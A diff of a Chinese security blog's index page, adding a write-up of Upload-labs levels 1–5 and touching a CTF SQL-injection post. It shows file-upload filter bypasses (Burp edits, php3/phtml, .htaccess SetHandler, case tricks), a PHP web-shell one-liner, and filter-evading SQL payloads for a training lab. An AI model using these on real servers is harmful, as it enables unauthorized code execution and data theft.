@@ -134,6 +134,117 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Upload-labs 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>本关介绍两种解题方法：</p>
+<p><strong>方法一</strong></p>
+<p>直接上传<code>webshell.php</code>时，发现前端弹出警告。按<code>F12</code>查看，在<code>javascript</code>的<code>白名单</code>中添加<code>php</code>这个后缀，然后就可以直接上传成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/1-1.png" alt="1-1"></p>
+<p><strong>方法二</strong></p>
+<p>先将webshell的后缀改为<code>png（或者白名单中任意后缀）</code>，然后上传，<code>Burpsuit</code>将数据包进行修改，重新将文件后缀改为<code>.php</code>，绕过前端验证就可以</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/1-2.png" alt="1-2"></p>
+<p><strong>核心代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="keyword">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>直接上传<code>.php</code>文件会提示<code>文件类型不正确，请重新上传！</code>。将文件后缀改为<code>.png</code>，抓包修改文件后缀为<code>.php</code></p>
+<p><img src alt="2-1"></p>
+<p>直接上传成功，蚁剑连接成功</p>
+<p><strong>核心代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>直接上传<code>.php</code>文件会提示<code>不允许上传.asp,.aspx,.php,.jsp后缀文件！</code>。将文件后缀改为<code>.png</code>，和 Less-2 一样抓包修改文件后缀，还是出现同样的提示</p>
+<p>按照提示来看，应该是采用黑名单，那就用<code>.php3</code>试着绕过，发现上传成功（<code>php3</code>、<code>php5</code>、<code>phtml</code>）</p>
+<p><img src alt="3-1"></p>
+<p>但是这些后缀名我的蚁剑都不能连接，一句话内容更改为<code>代码执行</code>的命令时，也只有<code>phtml</code>能被解析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> system($_GET[<span class="string">'pass'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src alt="3-2"></p>
+<p><strong>核心代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>直接上传<code>.php</code>文件只是提示<code>此文件不允许上传!</code>。将文件后缀改为<code>.png</code>，和 Less-2 一样抓包修改文件后缀为<code>php</code>或<code>phtml</code>等，还是出现同样的提示</p>
+<p>但是可以上传<code>.htaccess</code>，内容如下（该行代码的作用是使服务器将所有类型的文件都解析为php）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+<p><img src alt="4-1"></p>
+<blockquote>
+<p>在使用 .htaccess 之前，需要先开启对其的支持</p>
+<p>Linux：修改 /etc/apache2/apache2.conf 内的  AllowOverride 为 ALL（默认None）。然后重启 apache2 服务器</p>
+</blockquote>
+<p>上传成功后，我们上传一个大马，后缀随意</p>
+<p><img src alt="4-2"></p>
+<p>成功上传并且可以解析连接</p>
+<p><img src alt="4-3"></p>
+<p><strong>核心代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>先尝试前面的步骤，本关连<code>.htaccess</code>都无法上传，但是本关却可以通过大小写来绕过，尝试<code>.PHP</code></p>
+<p><img src alt="5-1"></p>
+<p>尝试连接，成功</p>
+<blockquote>
+<p>注意：大写PHP后缀名的解析，同样只存在于部分版本的apache</p>
+</blockquote>
+<p><img src alt="5-2"></p>
+<p><strong>核心代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本题从源码中可以看出来，前一关将后缀转换成小写的函数<code>strtolower()</code>在本关没有使用，所以可以导致大小写绕过黑名单</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><blockquote>
+<p>① 抓包修改文件后缀（绕过前端验证）</p>
+<p>② 抓包修改 Content-Type 字段</p>
+<p>③ 针对黑名单，修改文件后缀为 php3、php5、phtml、php.xxx 等常见绕过黑名单的后缀</p>
+<p>④ 上传 .htaccess 使所有类型文件都解析为 php 文件，然后上传黑名单之外的文件类型</p>
+<p>⑤ 大小写绕过黑名单</p>
+</blockquote>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Upload-labs</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/09/20/Upload-labs 第1-10关/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-DC5-DC8靶机渗透测试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -834,19 +945,19 @@
 
 
   
-    <article id="post-攻防世界 — Web进阶题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-攻防世界 — Web进阶题（1-10）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/09/05/攻防世界 — Web进阶题/">攻防世界 — Web进阶题(第1-10关)</a>
+      <a class="article-title" href="/Knlvre.github-io/2019/09/05/攻防世界 — Web进阶题（1-10）/">攻防世界 — Web进阶题(第1-10关)</a>
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/09/05/攻防世界 — Web进阶题/" class="archive-article-date">
+        <a href="/Knlvre.github-io/2019/09/05/攻防世界 — Web进阶题（1-10）/" class="archive-article-date">
   	<time datetime="2019-09-04T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-05</time>
 </a>
         
@@ -1020,7 +1131,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect hex(database()))+&apos;.jpg</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-6.png" alt="7-6"></p>
 <p>果然将结果处理为十六进制就能返回，将<code>十六进制转换为ASCII</code>，得到<code>web</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = &quot;7765625&quot;</span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">ascii_list = []</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0,len(s),2):</span><br><span class="line">	if(len(s[i:i+2])==2):</span><br><span class="line">		hex_list.append(s[i:i+2])</span><br><span class="line"></span><br><span class="line">for i in hex_list:</span><br><span class="line">	con_list.append(int(i,16))</span><br><span class="line"></span><br><span class="line">for i in con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)		#输出web</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"7765625"</span></span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">ascii_list = []</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">2</span>):</span><br><span class="line">	<span class="keyword">if</span>(len(s[i:i+<span class="number">2</span>])==<span class="number">2</span>):</span><br><span class="line">		hex_list.append(s[i:i+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hex_list:</span><br><span class="line">	con_list.append(int(i,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)		<span class="comment">#输出web</span></span><br></pre></td></tr></table></figure>
 <p>得到数据库名称之后，注表名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect hex(group_concat(table_name) frfromom information_schema.tables where table_schema=database()))+&apos;.jpg</span><br></pre></td></tr></table></figure>
 <p>成功提交后，刷新页面居然没有任何回显，现在开始怀疑是不是将我们转换为十六进制后的字母也过滤掉了</p>
@@ -1041,11 +1152,11 @@
 <p>第二部分（返回没有第一次长，应该是结束了）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex(database()),13,12),16,10))+&apos;.jpg</span><br><span class="line"></span><br><span class="line">#返回 1819238756</span><br></pre></td></tr></table></figure>
 <p>将两次返回的结果分别转换为ASCII</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s = [131277325825392,1819238756]</span><br><span class="line"></span><br><span class="line">for i in range(len(s)):</span><br><span class="line">	s[i] = hex(s[i])[2:]</span><br><span class="line"></span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in s:</span><br><span class="line">	for j in range(0,len(i),2):</span><br><span class="line">		hex_list.append(i[j:j+2])</span><br><span class="line"></span><br><span class="line">for i in hex_list:</span><br><span class="line">	con_list.append(int(i,16))</span><br><span class="line"></span><br><span class="line">for i in con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)		#输出 web_upload</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">131277325825392</span>,<span class="number">1819238756</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">	s[i] = hex(s[i])[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(i),<span class="number">2</span>):</span><br><span class="line">		hex_list.append(i[j:j+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hex_list:</span><br><span class="line">	con_list.append(int(i,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)		<span class="comment">#输出 web_upload</span></span><br></pre></td></tr></table></figure>
 <p><strong>注表名</strong></p>
